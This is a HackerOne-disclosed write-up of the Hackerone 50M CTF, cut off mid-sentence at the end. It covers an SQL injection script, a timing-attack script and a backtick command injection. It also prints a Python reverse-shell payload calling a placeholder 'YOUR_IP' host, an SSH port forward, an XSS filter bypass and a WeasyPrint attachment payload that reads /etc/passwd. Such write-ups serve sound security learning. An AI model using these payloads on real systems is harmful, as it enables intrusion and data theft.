{"id":512023,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTIwMjM=","url":"https://hackerone.com/reports/512023","title":"Writeup Hackerone 50M CTF","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2019-03-19T11:53:43.026Z","submitted_at":"2019-03-19T11:53:43.026Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"abdilahrf_","url":"/abdilahrf_","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/n40ouqrsu00sb54ypc8og89xlvqe/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22Webp.net-resizeimage-min.jpg%22%3B%20filename%2A%3DUTF-8%27%27Webp.net-resizeimage-min.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=929799941e7fc08055a17149849de77b20cc0000788f89145ed8d57c5b19ab7f"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:53:52.865Z","bug_reporter_agreed_on_going_public_at":"2019-04-06T05:37:53.203Z","team_member_agreed_on_going_public_at":"2019-04-08T15:53:52.781Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Writeup Hackerone 50m CTF\n\nFirst stage of this ctf we need to solve an hidden file from an image which posted by HackerOne at twitter [https://twitter.com/hacker0x01/status/1100543680383832065?lang=en](https://twitter.com/hacker0x01/status/1100543680383832065?lang=en).\n\nI tried to run bunch of steganography tools and i found something with `zteg` the exact command is `zteg -a h1-stege.png`\n\n```\nâžœ  h1702 zsteg -a h1-stege.png\n[..SNIP..]\nimagedata           .. text: \"E_B.\\n3T|=\"\nb6,bgr,lsb,xy,prime .. text: \"YETYEWUU\"\nb7,b,msb,xy,prime   .. text: \"(4:M \u0026Q(42\"\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\nb2,rgb,lsb,yx       .. file: PGP\\011Secret Sub-key -\nb3,r,lsb,yx         .. text: \"Q.L\\n4Af^\"\n[..SNIP..]\n```\nand i got the valid zlib file, and the link is https://bit.do/h1therm is a shortener link to and google drive files that lead us to an android apk thermostat.\n\n```\n$ curl -v https://bit.do/h1therm\n\u003e GET /h1therm HTTP/1.1\n\u003e Host: bit.do\n\u003e User-Agent: curl/7.52.1\n\u003e Accept: */*\n\u003e\n\u003c HTTP/1.1 301 Moved Permanently\n\u003c Date: Wed, 27 Feb 2019 15:51:35 GMT\n\u003c Server: Apache/2.2.34 (Amazon)\n\u003c Location: https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view?usp=sharing\n\u003c Content-Length: 363\n\u003c Connection: close\n\u003c Content-Type: text/html; charset=iso-8859-1\n```\n\n### The Thermostat App\n\nFirst i try to decompile the apk using `jadx` it takes me a while to understand the application workflow, the request and response to the backend server is encrypted by an `AES` but the flaws is they stored the secret key hardcoded in the apk\n\n```\n    protected Response\u003cString\u003e parseNetworkResponse(NetworkResponse networkResponse) {\n        try {\n            Object decode = Base64.decode(new String(networkResponse.data), 0);\n            Object obj = new byte[16];\n            System.arraycopy(decode, 0, obj, 0, 16);\n            Object obj2 = new byte[(decode.length - 16)];\n            System.arraycopy(decode, 16, obj2, 0, decode.length - 16);\n            Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n            AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec(obj);\n            Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n            instance.init(2, secretKeySpec, ivParameterSpec);\n            JSONObject jSONObject = new JSONObject(new String(instance.doFinal(obj2)));\n            if (jSONObject.getBoolean(\"success\")) {\n                return Response.success(null, getCacheEntry());\n            }\n            return Response.success(jSONObject.getString(\"error\"), getCacheEntry());\n        } catch (Exception unused) {\n            return Response.success(\"Unknown\", getCacheEntry());\n        }\n    }\n```\n\nthe secret key is :\n```\nKey secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n```\n\nso i able to re-implement the encrypt/decrypt function and able to send an plain json request, so i create a flask web app that act like a proxy to `catch the plain json request -\u003e encrypt request -\u003e send encrypted request -\u003e get encrypted response -\u003e decrypt encrypted response -\u003e return plaintext response`.\n\n```\n#!/usr/bin/env python2\nfrom Crypto.Cipher import AES\nfrom Crypto import Random\nimport os\nimport base64\nimport requests\nimport urllib\nimport json\nimport flask\n\napp = flask.Flask(__name__)\nkey = \"\".join([\"\\x38\",\"\\x4F\",\"\\x2E\",\"\\x6A\",\"\\x1A\",\"\\x05\",\"\\xE5\",\"\\x22\",\"\\x3B\",\"\\x80\",\"\\xE9\",\"\\x60\",\"\\xA0\",\"\\xA6\",\"\\x50\",\"\\x74\"])\niv = str(os.urandom(16))\n\nheaders = {\n\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \n\"User-Agent\": \"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A MIUI/V9.6.18.0.OCBMIFD)\", \n\"Connection\": \"close\", \n\"Accept-Encoding\": \"gzip, deflate\"\n}\n\ndef r_pad(payload, block_size=16):\n    length = block_size - (len(payload) % block_size)\n    return payload + chr(length) * length\n\ndef encrypt(raw):\n    cipher = AES.new(key, AES.MODE_CBC,iv)\n    ct_bytes = cipher.encrypt(r_pad(raw))\n    obj2 = iv + ct_bytes\n    ct = base64.b64encode(obj2).decode('utf-8')\n    return ct\n\ndef decrypt(enc):\n    encs = base64.b64decode(enc)\n    obj = encs[0:16]\n    cipher = AES.new(key, AES.MODE_CBC, obj)\n    # print(\"The message was: \", cipher.decrypt(encs), len(cipher.decrypt(encs)))\n    pt = cipher.decrypt(encs)[16:].split(\"}\")[0]+\"}\"\n    print \"[RESPONSE]: \" + pt\n    return pt\n\ndef make_request(jsondata):\n    raw_data = json.dumps(jsondata)\n    enc = encrypt(raw_data)\n    enc_data = urllib.quote_plus(enc+\"\\n\")\n    print \"[RAW]: \"+raw_data\n    print \"[ENC_DATA]: \"+enc\n    r = requests.post('http://35.243.186.41/', data={\"d\": enc}, headers=headers)\n    dec_data = decrypt(r.content)\n    # print decrypt(enc)\n    return dec_data, r.status_code\n\n@app.route('/', defaults={'u_path': ''})\n@app.route('/\u003cpath:u_path\u003e')\ndef main(u_path):\n    url = 'http://35.243.186.41' + flask.request.full_path[:-1]\n    print 'URL: ' + url\n    r = requests.get(url)\n    return r.content, r.status_code\n\n@app.route('/login', methods=['POST','GET'])\ndef login():\n    if flask.request.method == \"GET\":\n        return \"\"\"\n        \u003cform action=\"/login\" method=\"POST\"\u003e\n            \u003cinput type=\"text\" name=\"user\"\u003e\n            \u003cinput type=\"text\" name=\"pass\"\u003e\n            \u003cinput type=\"hidden\" name=\"cmd\" value=\"getTemp\"\u003e\n            \u003cinput type=\"hidden\" name=\"temp\" value=\"81\"\u003e\n            \u003cinput type=\"submit\"\u003e\n        \u003c/form\u003e\n        \"\"\"\n    else:\n        username = flask.request.form['user']\n        password = flask.request.form['pass']\n        cmd = flask.request.form['cmd']\n        req_data = {'username':username,'password':password,'cmd':cmd}\n        if cmd == \"setTemp\":\n            req_data = {'username':username,'password':password,'cmd':cmd,'temp':flask.request.form['temp']}\n\n        return make_request(req_data)\n\napp.run(debug = True)\n```\n\nafter doing some fuzzing i found that the application is vulnerable to an blind sql injection boolean-based , so i made a python scripts to automate the exploit.\n\n```\nimport requests\nimport re\nfrom StringIO import StringIO\nfrom pycurl import *\nimport os\n\n\nurl = \"http://127.0.0.1:5000/login\"\npayload = {\n    \"user\":\"\",\n    \"pass\":\"xxxx\",\n    \"cmd\":\"getTemp\"\n}\nheaders = {\n\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \n\"User-Agent\": \"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A MIUI/V9.6.18.0.OCBMIFD)\", \n\"Connection\": \"close\", \n\"Accept-Encoding\": \"gzip, deflate\"\n}\n\n\ndef check(data):\n    print data.elapsed.total_seconds()\n    if data.elapsed.total_seconds() \u003e 1:\n        return False\n    else:\n        return True\n\ndef check2(data):\n    # print data.text\n    return re.search(\"Invalid username or password\", data.text)\n\ndef blind(kolom,table):\n    passwd = \"\"\n    idx = 1\n\n    while (True):\n        lo = 1\n        hi = 255\n        temp = -1\n        while(lo \u003c= hi):\n            mid = (lo + hi) / 2         \n            # payload[\"user\"] = \"' or (SELECT CASE when (ascii(substr({},{},1)) \u003c= {}) THEN 1 ELSE sleep(1) END {}) or '\".format(str(kolom),str(idx),str(mid),str(table))\n            payload[\"user\"] = \"' or (SELECT CASE when (select ascii(substr({},{},1)) {}) \u003c= {} THEN (select 1) ELSE (select 1 union select 2) END) or '\".format(str(kolom),str(idx),str(table),str(mid))\n            # payload[\"user\"] = \"' or (select if(true, (select 1), (select 1 union select 2))) or '\"\n            res = requests.post(url,data=payload, headers=headers)\n            # print payload[\"user\"]\n            if check2(res):\n               hi = mid-1\n               temp = mid\n            else:\n               lo = mid+1\n               \n        if (hi == 0): break\n        passwd += chr(temp)\n        res = \"\"\n        print \"Result [{}]: {}\".format(table,passwd)\n        idx += 1\n\n    return passwd\n   \n\n\n# blind(\"user()\",\"\")\n# Result []: root@localhost\n\n# blind(\"@@version\",\"\")\n# Result []: 10.1.37-MariaDB-0+deb9u1\n\n# blind(\"database()\",\"\")\n# Result []: flitebackend\n\n# blind(\"schema()\",\"\")\n# Result []: flitebackend\n\n# blind(\"table_name\",\"from information_schema.tables where table_name!='devices'\")\n# blind(\"table_name\",\"from information_schema.tables where table_schema=schema()\")\n# Result [from information_schema.tables where table_schema=schema()]: devices\n# Result [from information_schema.tables where table_name!='devices']: users\n\n# blind(\"column_name\",\"from information_schema.columns where table_name='devices'\")\n# blind(\"column_name\",\"from information_schema.columns where table_name='devices' and column_name!='id'\")\n# blind(\"column_name\",\"from information_schema.columns where table_name='devices' and column_name not in ('id','ip')\")\n# id, ip\n\n# blind(\"column_name\",\"from information_schema.columns where table_name='users' and column_name not in ('id')\")\n# blind(\"column_name\",\"from information_schema.columns where table_name='users' and column_name not in ('id','username')\")\n# blind(\"column_name\",\"from information_schema.columns where table_name='users' and column_name not in ('id','username','password')\")\n# blind(\"column_name\",\"from information_schema.columns where table_name='users' and column_name not in ('id','username','password','USER')\")\n# id, username, password, USER\n\n# blind(\"password\",\"from users where username='admin'\")\n# 1, admin, 5f4dcc3b5aa765d61d8327deb882cf99 (password)\n# \n\nblind(\"group_concat(ip)\",\"from devices\")\n# 1, 10.176.194.225\n# 2, 244.181.238.206\n# 3, 243.221.130.19\n\n\n# x' AND 6492=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(ip AS CHAR),0x20) \n# FROM flitebackend.devices ORDER BY id LIMIT 2,1),6,1))\u003e87) THEN 6492 ELSE \n# (SELECT 4509 UNION SELECT 4483) END))-- Ysdo\n```\n\nafter that i got couple of information from the databases have 2 tables that have schema other than `information_schema` which is `users and devices`, from users table i got an admin credentials with username: admin and password: password but it was not quite usefull and from another table `devices` i got list of an ipaddress i tried run a `ping sweep` using this command  :\n```\nfor x in `cat ip_addr`; do ping -c 1 -W 1 $x | grep from; done\n```\nto the ipaddress list and found one `ipaddress` that accessible, which is http://104.196.12.98/ the next target that we should pwn.\n\n### FliteThermostat Admin\nafter trying to understanding the application, i notice a difference when send a valid hash length (64) and send a less than 64 character and made me think there is an timing attack, i tried to fuzz the first byte of the hash and notice have one longer response (when the byte is correct)  so i made a python script to automate the exploitation proccess, i made an flask web application that act like an proxy to send the encrypted request to target server.\n\nHere is the flask app : https://gist.github.com/abdilahrf/13f429ec0e74e2c98b44f53edf96d1b6\n\nthe flask app is simply take an user\u0026password and then encrypt the value using javascript function provided in the target application.\n\n```\nimport requests\nimport string\nfrom tqdm import tqdm\nimport random\n\nurl = \"http://127.0.0.1:5000/flite\"\n\nhashnya = \"f9{}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\nwhile True:\n    basket = {\"time\":0,\"hex\":\"xx\"}\n    fname  = hashnya.split(\"{}\")[0] + \"_\"+str(random.random())[2:]\n    for x in tqdm(range(256)):\n        ress = open(\"result/\" + fname,\"a\")\n        tmp = \"%0.2x\" % x\n        # print hashnya.format(tmp)\n        req = requests.post(url,data={\"hash\":hashnya.format(tmp)})\n        req_time = req.text\n        # req_time = req.elapsed.total_seconds()\n        if float(basket[\"time\"]) \u003c float(req_time):\n            basket[\"time\"] = float(req_time)\n            basket[\"hex\"] = tmp\n        ress.write(\"Bytes: \" + str(tmp)+\" \"+str(req_time)+\"\\n\")\n        ress.close()\n        print \"\\nBytes: \" + str(tmp),str(req_time)+\"\\n\"\n    hashnya = hashnya.format(basket[\"hex\"]+\"xx\").split(\"xx\")[0]+\"{}\"+\"a\"*(64-(len(hashnya.format(\"xx\").split(\"xx\")[0])+4))\n    print \"Current Hash: \" + str(hashnya)\n```\n\nthis exploit is send request to the proxy (flask application) and then analyze the response time which is returned in the body response from the flask app and then save all the response time to text file to help me manually analyze the response because sometime the timing just messed up.\n\nrunning out the scripts multiple times and finally get the correct hash to login into the application.\n\n```\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 0.9x - 1.2x)\nf9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 1.4x - 1.7x)\nf986aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 2.0x - 2.3x)\nf9865aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 2.4x - 2.8x)\nf9865a49aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 2.9x - 3.1x)\nf9865a4952aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 3.4x - 3.6x)\nf9865a4952a4aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 3.7x - 4.1x)\nf9865a4952a4f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 4.2x - 4.5x)\nf9865a4952a4f5d7aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 4.7x - 4.9x)\nf9865a4952a4f5d74baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 5.1x - 5.3x)\nf9865a4952a4f5d74b43aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 5.7x - 6.2x)\nf9865a4952a4f5d74b43f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 6.2x - 6.4x)\nf9865a4952a4f5d74b43f355aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 6.7x - 6.9x)\nf9865a4952a4f5d74b43f3558faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 7.2x - 7.6x) [8f]\nf9865a4952a4f5d74b43f3558fedaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 7.7x - 8.1x) [ed]\nf9865a4952a4f5d74b43f3558fed6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 8.2x - 8.4x) [6a][still not sure]\nf9865a4952a4f5d74b43f3558fed6a02aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 8.4x - 8.9x) [02]\nf9865a4952a4f5d74b43f3558fed6a0225aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 9.4x - 9.5x) [25]\nf9865a4952a4f5d74b43f3558fed6a0225c6aaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 9.5x - 9.9x) [c6]\nf9865a4952a4f5d74b43f3558fed6a0225c687aaaaaaaaaaaaaaaaaaaaaaaaaa ( 10.0 - 10.4) [87]\nf9865a4952a4f5d74b43f3558fed6a0225c6877faaaaaaaaaaaaaaaaaaaaaaaa ( 10.9 - 11.1) [7f]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fbaaaaaaaaaaaaaaaaaaaaaaa ( 11.2 - 11.4) [ba]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60aaaaaaaaaaaaaaaaaaaa ( 11.8 - 11.9) [60]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2aaaaaaaaaaaaaaaaaa ( 12.1 - 12.3) [a2]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250aaaaaaaaaaaaaaaa ( 12.7 - 13.4) [50]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcaaaaaaaaaaaaaa ( 13.3 - 13.6) [bc]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbdaaaaaaaaaaaa ( 13.8 - 14.0) [bd]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7aaaaaaaaaa ( 14.0 - 14.4) [e7]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753aaaaaaaa ( 14.7 - 14.9) [53]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5aaaaaa ( 15.1 - 15.5) [f5]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5dbaaaa ( 1 - 15.9) [db]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13aa ( 16.4) [13]\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8 ( 16.9 ) [d8]\n```\n\nAnd got a `session` cookie when logged in using the correct hash, at the first time i thought that was an `JWT` but it was not, that was an Flask session token which structured as `[Payload].[Expiry].[Signature]` , tried an attack to find if the session generated using a weak key but it was not working.\n\nAfter  strugling around i found that `http://104.196.12.98/update?port=80` have a hidden parameter `port` and i just think there must be another hidden parameter and i make a custom wordlist to bruteforce the parameter using burp intruder and found another `update_host` as a valid parameter reflecting to the output.\n\nthe `update_host` parameter is vulnerable to Remote Code Execution we can execute any arbitary code just by using a backtick.\n\n{F445021}\n\ncreate a reverse shell using python \n```\n http://104.196.12.98/update?port=80\u0026update_host=`python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22YOUR_IP%22,1212));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27`\n```\n\nand then `python -c 'import pty;pty.spawn(\"/bin/bash\")'` to spawn a TTY, I realize that we still on a container and scanning the network give me other internal application called `Accounting` and i create remote port forwarding using an ssh\n```\nssh -v -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -fN -R IP_ADDR:8663:172.28.0.3:80 abdilahrf@IP_ADDR\n```\n\n{F445019}\n\nAnd again the application is behave diferently when i try to inject the parameter password with SQL Injection, after 2 days for looking any working exploits i just realize another way to get in to the application in [http://IP_ADDR:8663/invoices](http://IP_ADDR:8663/invoices) they have an HTML Comment to [http://IP_ADDR:8663/invoices/new](http://IP_ADDR:8663/invoices/new) which doesn't ask for any authentication, so the authentication is an rabbit hole 100%.\n\nafter a while i found that the application is detecting substring of `script` and remove the string i can abuse that to bypass any filter used in the application like close tag filter and even bypass the chrome auditor. \n\nto close tag i can use `\u003cscript/style\u003e` so we can close the style tag and do something else, on  the preview i got an xss using this payload :\n```\nhttp://IP_ADDR:8663/invoices/preview?d={%20%22companyName%22:%20%22Hackerone%22,%20%22email%22:%20%22administrator@hackerone.com%22,%20%22invoiceNumber%22:%20%221337%22,%20%22date%22:%20%221337-1337-01%22,%20%22items%22:%20[%20[%221%22,%20%22%22,%20%22%22,%20%2210%22]%20],%20%22styles%22:%20{%20%22body%22:%20{%20%22background-color%22:%20%22white%22,%20%22%3Cscript/style%3E%3Cscrscriptipt%3Ealescriptrt(1337);%3Cscript/scrscriptipt%3E%3Ch2%20id=%27result%27%3Ex%3Cscript/h2%3E%22:%22x%22%20}%20}%20}\n```\n\ntried to embed an image and i got response from the server which say the user agent `weasyprint 44`\n\n{F445023}\n\nafter reading the github repository to get an idea how `weasyprint` work i found that, they didn't support javascript at all so the attack vector using javascript is gone, and also for render the `SVG` they using an `CairoSVG` which is already use `defusedxml` so we cannot do an `XXE` too here.\n\nstruggling around and found that we able to abuse the feature from `weasypdf` \n\n{F445020}\n\nthat feature is allow us to embed any file to the pdf, so i try to embed /etc/passwd using this payload :\n\n```\n{\n  \"companyName\": \"Hackerone\",\n  \"email\": \"administrator@hackerone.com\",\n  \"invoiceNumber\": \"1337\",\n  \"date\": \"1337-1337-01\",\n  \"items\": [\n    [\n      \"1\",\n      \"\",\n      \"\",\n      \"10\"\n    ]\n  ],\n  \"styles\": {\n    \"body\": {\n      \"background-color\": \"white\",\n      \"\u003cscript/style\u003e\u003ca rel='attachment' href='file:///etc/passwd'\u003efile\u003cscript/a\u003e\u003cstyle\u003e*{background-image\": \"url('')\"\n    }\n  }\n}\n```\n```\nURL ENCODED:\n%7B%0D%0A++%22companyName%22%3A+%22Hackerone%22%2C%0D%0A++%22email%22%3A+%22administrator%40hackerone.com%22%2C%0D%0A++%22invoiceNumber%22%3A+%221337%22%2C%0D%0A++%22date%22%3A+%221337-1337-01%22%2C%0D%0A++%22items%22%3A+%5B%0D%0A++++%5B%0D%0A++++++%221%22%2C%0D%0A++++++%22%22%2C%0D%0A++++++%22%22%2C%0D%0A++++++%2210%22%0D%0A++++%5D%0D%0A++%5D%2C%0D%0A++%22styles%22%3A+%7B%0D%0A++++%22body%22%3A+%7B%0D%0A++++++%22background-color%22%3A+%22white%22%2C%0D%0A++++++%22%3Cscript%2Fstyle%3E%3Ca+rel%3D%27attachment%27+href%3D%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3Efile%3Cscript%2Fa%3E%3Cstyle%3E%2A%7Bbackground-image%22%3A+%22url%28%27%27%29%22%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D\n```\n\nand using `pdfdetach` to extract the embeded file from the PDF.\n\n```\nâžœ  dump pdfdetach -saveall etcpasswd.pdf\nâžœ  dump cat passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\nâžœ  dump\n```\n\nwe able to read the filesystem, now the problem is to read source code of the application, after a while i found that able to read from `/proc/` path so i embed `/proc/self/cmdline` and i found the command used to run the program with the parameter is `/usr/local/bin/uwsgi --ini /etc/uwsgi/uwsgi.ini`  try to read `\n/etc/uwsgi/uwsgi.ini` to find the application path without any luck.\n\nand after i check the environment here  `/proc/self/environment`  i found there is another configuration file `/app/uwsgi.ini` \n\n```\nNGINX_WORKER_PROCESSES=1\nUWSGI_CHEAPER=2\nNGINX_MAX_UPLOAD=0\nSUPERVISOR_GROUP_NAME=uwsgi\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/root\nUWSGI_PROCESSES=16\nLANG=C.UTF-8\nSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock\nPYTHON_VERSION=3.7.2\nSHLVL=0\nPYTHON_PIP_VERSION=19.0.1\nSUPERVISOR_ENABLED=1\nNJS_VERSION=1.15.8.0.2.7-1~stretch\nUWSGI_INI=/app/uwsgi.ini\nNGINX_VERSION=1.15.8-1~stretch\nSTATIC_PATH=/app/static\nGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nPYTHONPATH=/app\nSTATIC_URL=/static\nSUPERVISOR_PROCESS_NAME=uwsgi\nFLAG=nice try\nLISTEN_PORT=80\nHOSTNAME=593f273e8b3e\nPWD=/app\n```\n\nReading `/app/uwsgi.ini` give information about the module name so we can read `/app/main.py` since we already know the path is `/app` from `/proc/self/environ`\n```\n[uwsgi]\nmodule = main\ncallable = app\n#listen = 16384\nlazy-apps = true\nmaster = true\nprocesses = 100\nmax-requests = 1000\n#logto = /var/log/uwsgi.log\nharakiri = 45\n```\n\nreading `/app/main.py` give us the application code.\n\n```\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to 